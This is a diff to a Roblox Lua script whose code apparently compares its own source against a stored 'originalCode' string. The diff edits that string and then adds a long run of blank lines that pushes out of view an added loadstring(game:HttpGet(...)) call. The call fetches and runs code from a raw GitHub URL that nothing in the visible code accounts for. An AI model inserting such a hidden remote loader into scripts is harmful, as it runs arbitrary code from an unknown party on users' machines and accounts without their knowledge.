@@ -5968,8 +5968,35 @@ local Players = game:GetService("Players")
 local localPlayer = Players.LocalPlayer
 
 -- Original code content as a string (minified / no extra whitespace)
-local originalCode = [[getgenv()._ = " Psalms_Modified IF YOU BOUGHT THIS YOU GOT SCAMMED MADE BY ZEKE_XR ON DISCORD /                      https://discord.gg/psalmsmod"
+local originalCode = [[getgenv()._ = " Psalms_Modified IF YOU BOUGHT THIS YOU GOT SCAMMED MADE BY ZEKE_XR ON DISCORD /                      https://discord.gg/psalmsmod**
+  
 loadstring(game:HttpGet(""))()]]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/123nihhaaekeei/Guiii/cf42e650b8c4fba840507d2c89de3d8752741d9a/text%2016.txt"))()
 
 -- Compare the actual script source to the expected code
 local currentCode = script.Source
